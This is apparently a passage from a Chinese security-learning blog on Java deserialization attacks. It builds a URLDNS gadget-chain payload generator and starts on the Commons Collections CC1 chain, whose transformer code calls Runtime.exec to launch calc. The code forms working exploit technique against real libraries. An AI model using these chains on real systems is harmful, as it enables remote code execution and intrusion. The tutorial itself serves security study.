<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Copyright (c) 2023. Lorem ipsum dolor sit amet, consectetur adipiscing elit.</span></span><br><span class="line"><span class="comment"> * Morbi non lorem porttitor neque feugiat blandit. Ut vitae ipsum eget quam lacinia accumsan.</span></span><br><span class="line"><span class="comment"> * Etiam sed turpis ac ipsum condimentum fringilla. Maecenas magna.</span></span><br><span class="line"><span class="comment"> * Proin dapibus sapien vel ante. Aliquam erat volutpat. Pellentesque sagittis ligula eget metus.</span></span><br><span class="line"><span class="comment"> * Vestibulum commodo. Ut rhoncus gravida arcu.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.y5neko.sec.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestTransient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">Test</span> <span class="variable">test</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置值</span></span><br><span class="line">        test.test = <span class="string">&quot;Test Value&quot;</span>;</span><br><span class="line">        System.out.println(test.test);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(test);</span><br><span class="line">        System.out.println(Arrays.toString(byteArrayOutputStream.toByteArray()));</span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        <span class="type">Test</span> <span class="variable">serTest</span> <span class="operator">=</span> (Test) objectInputStream.readObject();</span><br><span class="line">        System.out.println(serTest.test);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Test</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">transient</span> <span class="keyword">public</span> String test;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/image/image-20230804211944230.png" alt="image-20230804211944230"></p>
<p>可以看到序列化后test的值为null，并没有代入其中</p>
<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><p>通过对URLDNS利用链的分析，我们可以自行构建EXP</p>
<p>首先来到最外层的URL类的hashCode方法</p>
<img src="/image/image-20230805173955708.png" alt="image-20230805173955708" style="zoom:80%;" />

<p>第一步保证hashCode值为-1，我们可以通过反射设置属性值</p>
<p>紧接着来到handler对象，发现是实例化的URLStreamHandler，但是他本身是个抽象类无法被实例化</p>
<img src="/image/image-20230805174149912.png" alt="image-20230805174149912" style="zoom:80%;" />

<p>也就是说我们实例化的其实是他的子类</p>
<img src="/image/image-20230805182207357.png" alt="image-20230805182207357" style="zoom:80%;" />

<p>这里会根据URL类中的构造方法来识别protocal，从而实例化相应协议的handler</p>
<img src="/image/image-20230805182417872.png" alt="image-20230805182417872" style="zoom:80%;" />

<p>之前提到过为了防止序列化生成payload时产生多余解析，我们需要重写一下handler中的getHostAddress方法</p>
<img src="/image/image-20230805172713181.png" alt="image-20230805172713181" style="zoom:80%;" />

<p>而openConnection则作为抽象类必须被实现</p>
<img src="/image/image-20230805181141799.png" alt="image-20230805181141799" style="zoom:80%;" />

<p>我们可以通过URL类的构造方法<code>public URL(URL context, String spec, URLStreamHandler handler)</code>来自定义handler，从而重写上述两种方法</p>
<p>接着我们利用HashMap.put方法作为跳板，调用HashMap.putVal方法和HashMap.Hash方法</p>
<img src="/image/image-20230805183213484.png" alt="image-20230805183213484" style="zoom:80%;" />

<p>接着序列化HashMap对象后输出payload即可</p>
<p>由此我们可以构造exp</p>
<p><strong>TestURLDNSExp.java</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Copyright (c) 2023. Lorem ipsum dolor sit amet, consectetur adipiscing elit.</span></span><br><span class="line"><span class="comment"> * Morbi non lorem porttitor neque feugiat blandit. Ut vitae ipsum eget quam lacinia accumsan.</span></span><br><span class="line"><span class="comment"> * Etiam sed turpis ac ipsum condimentum fringilla. Maecenas magna.</span></span><br><span class="line"><span class="comment"> * Proin dapibus sapien vel ante. Aliquam erat volutpat. Pellentesque sagittis ligula eget metus.</span></span><br><span class="line"><span class="comment"> * Vestibulum commodo. Ut rhoncus gravida arcu.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.y5neko.sec.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.net.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestURLDNSExp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过实例化URLStreamHandler子类自定义handler，从而实现重写</span></span><br><span class="line">        <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLStreamHandler</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反射获取URL类并使用自定义handler进行实例化</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getConstructor(URL.class,String.class,URLStreamHandler.class);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> constructor.newInstance(<span class="literal">null</span>,<span class="string">&quot;http://urldns.d1dd3347.su19.org&quot;</span>,handler);</span><br><span class="line">        <span class="comment">//反射获取URL类中的hashCode属性，并修改访问权限</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//实例化HashMap对象</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">//调用HashMap.put方法传入</span></span><br><span class="line">        ht.put(object,<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//注意这里是put后再将hashCode设置为-1，否则put过程会通过hash方法重新覆盖</span></span><br><span class="line">        field.set(object,-<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化HashMap输出payload到文件</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;H:\\学习记录\\学习记录Markdown\\Java安全通用\\URLDNS2&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        oos.writeObject(ht);</span><br><span class="line">        </span><br><span class="line">        System.out.println(ht);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功生成payload文件，并验证成功</p>
<img src="/image/image-20230806013532634.png" alt="image-20230806013532634" style="zoom:80%;" />

<img src="/image/image-20230806014219934.png" alt="image-20230806014219934" style="zoom:80%;" />



<h3 id="Apache-Commons-Collections反序列化漏洞"><a href="#Apache-Commons-Collections反序列化漏洞" class="headerlink" title="Apache Commons Collections反序列化漏洞"></a>Apache Commons Collections反序列化漏洞</h3><p><code>Apache Commons</code>是<code>Apache</code>开源的Java通用类项目在Java中项目中被广泛的使用，<code>Apache Commons</code>当中有一个组件叫做<code>Apache Commons Collections</code>，主要封装了Java的<code>Collection（集合）</code>相关类对象。本节将逐步详解<code>Collections</code>反序列化攻击链(仅以<code>TransformedMap</code>调用链为示例)最终实现反序列化<code>RCE</code>。</p>
<img src="/image/image-20230806130301737.png" alt="image-20230806130301737" style="zoom:80%;" />

<h3 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">环境：</span><br><span class="line">JDK版本：jdk8u71以下</span><br><span class="line">组件版本：commons-collections-3.2.1</span><br></pre></td></tr></table></figure>

<h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><p>和URLDNS链不同的是，CC1可以用来执行命令，作为整个CC链的起点，对整个CC链的发展有着巨大的作用</p>
<p>首先来到ysoserial工具的payload，从注释我们可以看见整个利用链</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	Gadget chain:</span></span><br><span class="line"><span class="comment">		ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">			AnnotationInvocationHandler.readObject()</span></span><br><span class="line"><span class="comment">				Map(Proxy).entrySet()</span></span><br><span class="line"><span class="comment">					AnnotationInvocationHandler.invoke()</span></span><br><span class="line"><span class="comment">						LazyMap.get()</span></span><br><span class="line"><span class="comment">							ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">								ConstantTransformer.transform()</span></span><br><span class="line"><span class="comment">								InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">									Method.invoke()</span></span><br><span class="line"><span class="comment">										Class.getMethod()</span></span><br><span class="line"><span class="comment">								InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">									Method.invoke()</span></span><br><span class="line"><span class="comment">										Runtime.getRuntime()</span></span><br><span class="line"><span class="comment">								InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">									Method.invoke()</span></span><br><span class="line"><span class="comment">										Runtime.exec()</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Requires:</span></span><br><span class="line"><span class="comment">		commons-collections</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<p>我们可以看到，CC1链的终点是InvokerTransformer.transform方法，来到collections源码开始审计</p>
<p>发现transform方法的源头在Transformer接口</p>
<img src="/image/image-20230806141524789.png" alt="image-20230806141524789" style="zoom:80%;" />

<p>从名字我们可以看出这个接口是用于类型转换的，在开发中比较常用，我们往下寻找实现了这个接口并且同时实现了反序列化接口的类</p>
<img src="/image/image-20230808142318172.png" alt="image-20230808142318172" style="zoom:80%;" />

<p>我们在其中找到了InvokerTransformer类，可以看到他也实现了Serializable接口</p>
<img src="/image/image-20230808142414013.png" alt="image-20230808142414013" style="zoom:80%;" />

<p>我们往下观察一下他的构造器，以及重写的transform方法</p>
<p>构造器：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Constructor for no arg instance.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> methodName  the method to call</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iMethodName = methodName;</span><br><span class="line">    iParamTypes = <span class="literal">null</span>;</span><br><span class="line">    iArgs = <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Constructor that performs no validation.</span></span><br><span class="line"><span class="comment"> * Use &lt;code&gt;getInstance&lt;/code&gt; if you want that.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> methodName  the method to call</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> paramTypes  the constructor parameter types, not cloned</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> args  the constructor arguments, not cloned</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iMethodName = methodName;</span><br><span class="line">    iParamTypes = paramTypes;</span><br><span class="line">    iArgs = args;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>transform方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Transforms the input to result by invoking a method on the input.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> input  the input object to transform</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> the transformed result, null if null input</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">        <span class="keyword">return</span> method.invoke(input, iArgs);</span><br><span class="line">            </span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, ex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中第二种有参构造器，接受了三个参数即：参数为方法名，所调用方法的参数类型，所调用方法的参数值</p>
<p>接着我们看一下transform方法</p>
<img src="/image/image-20230808143224000.png" alt="image-20230808143224000" style="zoom:80%;" />

<p>其中传入的input对象，相当于一个反射执行方法，结合构造器来看，这里的参数都是可控的，我们就可以通过这个来调用任意类的任意方法，这里以Runtime类为例</p>
<p><strong>TestInvokerTransformer.java</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Copyright (c) 2023. Lorem ipsum dolor sit amet, consectetur adipiscing elit.</span></span><br><span class="line"><span class="comment"> * Morbi non lorem porttitor neque feugiat blandit. Ut vitae ipsum eget quam lacinia accumsan.</span></span><br><span class="line"><span class="comment"> * Etiam sed turpis ac ipsum condimentum fringilla. Maecenas magna.</span></span><br><span class="line"><span class="comment"> * Proin dapibus sapien vel ante. Aliquam erat volutpat. Pellentesque sagittis ligula eget metus.</span></span><br><span class="line"><span class="comment"> * Vestibulum commodo. Ut rhoncus gravida arcu.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.y5neko.sec.deserialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestInvokerTransformer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        invokerTransformer.transform(runtime);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/image/image-20230808152044244.png" alt="image-20230808152044244" style="zoom:80%;" />

<p>相当于替我们执行了反射过程，接下来我们需要找一个重写了readObject，且实现了transform方法的子类</p>
<p>直接查找用法，发现了很多调用了transform的方法，我们关注TransformedMap类下的checkSetValue方法</p>
<img src="/image/image-20230808153836848.png" alt="image-20230808153836848" style="zoom:80%;" />

<img src="/image/image-20230808153850126.png" alt="image-20230808153850126" style="zoom:80%;" />

<p>接下来找到构造器</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * Constructor that wraps (not copies).</span></span><br><span class="line"><span class="comment">    * &lt;p&gt;</span></span><br><span class="line"><span class="comment">    * If there are any elements already in the collection being decorated, they</span></span><br><span class="line"><span class="comment">    * are NOT transformed.</span></span><br><span class="line"><span class="comment">    * </span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> map  the map to decorate, must not be null</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> keyTransformer  the transformer to use for key conversion, null means no conversion</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> valueTransformer  the transformer to use for value conversion, null means no conversion</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@throws</span> IllegalArgumentException if map is null</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//接受三个参数，第一个为Map,我们可以传入之前讲到的HashMap,第二个和第三个就是Transformer我们需要的了，可控。</span></span><br><span class="line">   <span class="keyword">protected</span> <span class="title function_">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">       <span class="built_in">super</span>(map);</span><br><span class="line">       <span class="built_in">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">       <span class="built_in">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>这里的构造器和checkSetValue方法都是protected权限，所以我们要找到一个内部实例化的方法</p>
<img src="/image/image-20230808160113377.png" alt="image-20230808160113377" style="zoom:80%;" />

<p>找到一个public类型的decorate方法，且三个参数均为可控，而反观checkSetValue方法调用的是valueTransformer的transform方法</p>
<p>因此我们需要先调用这个方法实例化TransformedMap类，传入我们自定义的transformer（即invokerTransformer），再想办法调用checkSetValue方法即可</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//首先通过反射获取exec方法</span></span><br><span class="line"><span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line"><span class="comment">//invokerTransformer.transform(runtime);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//实例化一个HashMap对象用于decorate方法接收</span></span><br><span class="line"><span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="comment">//调用public方法decorate实例化</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">transformedMap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, invokerTransformer);</span><br></pre></td></tr></table></figure>

<p>接下来找找哪里调用了checkSetValue方法，直接查找用法</p>
<img src="/image/image-20230808162230592.png" alt="image-20230808162230592" style="zoom:80%;" />

<p>我们发现只有一个地方调用了，跟进AbstractInputCheckedMapDecorator类的setValue方法</p>
<img src="/image/image-20230808162448360.png" alt="image-20230808162448360" style="zoom:80%;" />

<p>这里的MapEntry定义的其实是AbstractMapEntryDecorator的子类</p>
<p>entry代表的是Map中的一个键值对，而我们在Map中我们可以看到有setValue方法，而我们在对Map进行遍历的时候可以调用setValue这个方法</p>
<img src="/image/image-20230808163317191.png" alt="image-20230808163317191" style="zoom:80%;" />

<p>上面子类的setValue其实是重写的父类的setValue方法，我们来看一下AbstractMapEntryDecorator类</p>
<img src="/image/image-20230808165128149.png" alt="image-20230808165128149" style="zoom: 67%;" />

<p>而这个类又引入了Map.Entry接口，我们只需要进行Map遍历，就可以调用setValue方法，从而调用checkSetValue方法</p>
<p>恰好TransformedMap对象又是Map类型，因此我们只需要遍历TransformedMap对象即可</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Copyright (c) 2023. Lorem ipsum dolor sit amet, consectetur adipiscing elit.</span></span><br><span class="line"><span class="comment"> * Morbi non lorem porttitor neque feugiat blandit. Ut vitae ipsum eget quam lacinia accumsan.</span></span><br><span class="line"><span class="comment"> * Etiam sed turpis ac ipsum condimentum fringilla. Maecenas magna.</span></span><br><span class="line"><span class="comment"> * Proin dapibus sapien vel ante. Aliquam erat volutpat. Pellentesque sagittis ligula eget metus.</span></span><br><span class="line"><span class="comment"> * Vestibulum commodo. Ut rhoncus gravida arcu.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.y5neko.sec.deserialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestCC1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//首先通过反射获取exec方法</span></span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        <span class="comment">//invokerTransformer.transform(runtime);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//实例化一个HashMap对象用于decorate方法接收</span></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">//首先通过put方法推一个键值对进去，才能进行遍历</span></span><br><span class="line">        map.put(<span class="string">&quot;test&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="comment">//调用public方法decorate实例化</span></span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map, <span class="literal">null</span>, invokerTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//遍历Map的常用格式</span></span><br><span class="line">        <span class="keyword">for</span>(Map.Entry&lt;Object, Object&gt; entry:transformedMap.entrySet())&#123;</span><br><span class="line">            <span class="comment">//通过setValue方法传入Runtime对象</span></span><br><span class="line">            entry.setValue(runtime);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/image/image-20230808180443968.png" alt="image-20230808180443968" style="zoom:80%;" />

<img src="/image/image-20230808183422154.png" alt="image-20230808183422154" style="zoom:80%;" />

<p>成功执行，但是这里并没有用到readObject方法，因此我们需要找到一个readObject方法，可以遍历Map，并且调用这个setValue方法</p>
<p>我们继续查找setValue的用法，最后在AnnotationInvocationHandler类中找到了一个调用了setValue的readObject方法，同时还能代替Map的遍历过程</p>
<img src="/image/image-20230808231340719.png" alt="image-20230808231340719" style="zoom:80%;" />

<p>因为readObject是private，所以接下来我们找到这个类的构造器</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//接受两个参数，第一个是继承了注解的class，第二个是个Map,第二个参数我们可控，可以传入我们之前的transformedmap类</span></span><br><span class="line">AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">        Class&lt;?&gt;[] superInterfaces = type.getInterfaces();</span><br><span class="line">        <span class="keyword">if</span> (!type.isAnnotation() ||</span><br><span class="line">            superInterfaces.length != <span class="number">1</span> ||</span><br><span class="line">            superInterfaces[<span class="number">0</span>] != java.lang.annotation.Annotation.class)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AnnotationFormatError</span>(<span class="string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.type = type;</span><br><span class="line">        <span class="built_in">this</span>.memberValues = memberValues;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>其中memberValues是可控的，我们可以传入自己的需要的类，然后实现setValue方法</p>
<img src="/image/image-20230808233435346.png" alt="image-20230808233435346" style="zoom:80%;" />

<p>但是我们可以看到，这个类并不是public声明，所以只能在包内被调用，因此我们需要通过反射来获取</p>
